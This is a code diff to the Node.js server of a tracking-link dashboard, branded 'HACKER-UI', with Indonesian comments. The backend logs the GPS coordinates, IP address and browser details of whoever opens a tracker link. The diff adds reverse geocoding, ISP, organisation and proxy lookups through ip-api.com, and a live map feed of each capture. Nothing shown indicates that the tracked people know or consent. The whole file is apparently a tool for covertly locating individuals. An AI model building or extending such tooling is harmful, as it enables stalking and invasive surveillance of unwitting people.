@@ -1,4 +1,4 @@
-// File: server.js (v3.6 - Menampilkan Lokasi di Tabel Utama)
+// File: server.js (v3.7 - Intelijen IP & Peta Langsung)
 
 require('dotenv').config();
 
@@ -31,7 +31,6 @@ app.use(express.static(__dirname));
 
 const broadcastDashboardUpdate = async () => {
     try {
-        // !!! QUERY DIPERBARUI UNTUK MENGAMBIL LOKASI TERAKHIR !!!
         const [links] = await db.promise().query(`
             SELECT 
                 l.id, l.original_url, l.created_at, l.expires_at, 
@@ -156,26 +155,53 @@ app.post('/log', async (req, res) => {
         const [users] = await db.promise().query('SELECT id FROM users WHERE username = ?', [username]);
         if (users.length === 0) return res.status(404).json({ status: 'error', message: 'User not found' });
 
+        // [START] Fitur Intelijen IP
         let country = null, city = null, region = null;
+        let isp = null, org = null, proxy = false;
+
         try {
+            // Panggil API Geocoding dari OpenCage
             const apiKey = process.env.OPENCAGE_API_KEY;
             if (!apiKey) {
                 console.warn("⚠️  OPENCAGE_API_KEY not found in .env. Skipping geocoding.");
             } else {
-                const url = `https://api.opencagedata.com/geocode/v1/json?q=${latitude}+${longitude}&key=${apiKey}&language=id&pretty=1`;
-                const response = await axios.get(url);
-                const components = response.data.results[0]?.components;
+                const geoUrl = `https://api.opencagedata.com/geocode/v1/json?q=${latitude}+${longitude}&key=${apiKey}&language=id&pretty=1`;
+                const geoResponse = await axios.get(geoUrl);
+                const components = geoResponse.data.results[0]?.components;
                 if (components) {
                     country = components.country;
                     city = components.city || components.town || components.village || components.state_district;
                     region = components.state;
                 }
             }
-        } catch (geoError) {
-            console.error("❌ Geocoding error:", geoError.message);
-        }
 
-        const newLocation = { user_id: users[0].id, tracker_id: trackerId, latitude, longitude, ip_address: ipAddress, user_agent: userAgentString, country, city };
+            // Panggil API Intelijen IP (ip-api.com, tidak perlu API key untuk penggunaan dasar)
+            const ipUrl = `http://ip-api.com/json/${ipAddress}?fields=status,message,isp,org,proxy`;
+            const ipResponse = await axios.get(ipUrl);
+            if (ipResponse.data.status === 'success') {
+                isp = ipResponse.data.isp;
+                org = ipResponse.data.org;
+                proxy = ipResponse.data.proxy;
+            }
+        } catch (apiError) {
+            console.error("❌ Gagal memanggil API eksternal:", apiError.message);
+        }
+        // [END] Fitur Intelijen IP
+
+        const newLocation = { 
+            user_id: users[0].id, 
+            tracker_id: trackerId, 
+            latitude, 
+            longitude, 
+            ip_address: ipAddress, 
+            user_agent: userAgentString, 
+            country, 
+            city,
+            // Data baru dari Intelijen IP
+            isp,
+            org,
+            proxy
+        };
         await db.promise().query('INSERT INTO locations SET ?', newLocation);
 
         const parser = new UAParser(userAgentString);
@@ -187,6 +213,12 @@ app.post('/log', async (req, res) => {
         broadcastLogMessage(`> Location ${locationInfo} from [${username}] | ${browserInfo} on ${osInfo} | IP: ${ipAddress}`);
         console.log(`📍 Lokasi diterima dari: ${username} [${ipAddress}] - ${city || 'Unknown City'}, ${country || 'Unknown Country'}`);
         broadcastDashboardUpdate();
+        
+        // [START] Fitur Peta Langsung - Kirim event baru
+        const newLocationDataForMap = { ...newLocation, username };
+        io.emit('new_location_logged', newLocationDataForMap);
+        // [END] Fitur Peta Langsung
+
         res.json({ status: 'success' });
     } catch (error) {
         console.error("Error logging location:", error);
@@ -209,8 +241,11 @@ app.delete('/api/links/:id', async (req, res) => {
 app.get('/api/locations', async (req, res) => {
     try {
         const [rows] = await db.promise().query(`
-            SELECT l.latitude, l.longitude, l.created_at, l.ip_address, l.user_agent, l.tracker_id, l.country, l.city, u.username
-            FROM locations l JOIN users u ON l.user_id = u.id ORDER BY l.created_at DESC`);
+            SELECT l.*, u.username
+            FROM locations l 
+            JOIN users u ON l.user_id = u.id 
+            ORDER BY l.created_at DESC
+        `);
         res.json(rows);
     } catch (err) {
         res.status(500).json({ error: 'Database error' });
@@ -220,9 +255,11 @@ app.get('/api/locations', async (req, res) => {
 app.get('/api/locations/:trackerId', async (req, res) => {
     const { trackerId } = req.params;
     try {
+        // Ambil juga data intelijen IP
         const [locations] = await db.promise().query(`
-            SELECT latitude, longitude, created_at, ip_address, user_agent, country, city
+            SELECT latitude, longitude, created_at, ip_address, user_agent, country, city, isp, org, proxy 
             FROM locations WHERE tracker_id = ? ORDER BY created_at DESC`, [trackerId]);
+        
         const parser = new UAParser();
         const parsedLocations = locations.map(loc => {
             const ua = parser.setUA(loc.user_agent).getResult();
@@ -236,7 +273,7 @@ app.get('/api/locations/:trackerId', async (req, res) => {
 
 // ================== RUN SERVER ================== //
 server.listen(PORT, () => {
-    console.log(`\n HACKER-UI DASHBOARD v3.6 (Dashboard Location View)`);
+    console.log(`\n HACKER-UI DASHBOARD v3.7 (Intelijen IP & Peta Langsung)`);
     console.log(`===================================================`);
     console.log(`✅ Server berjalan di http://localhost:${PORT}\n`);
 });
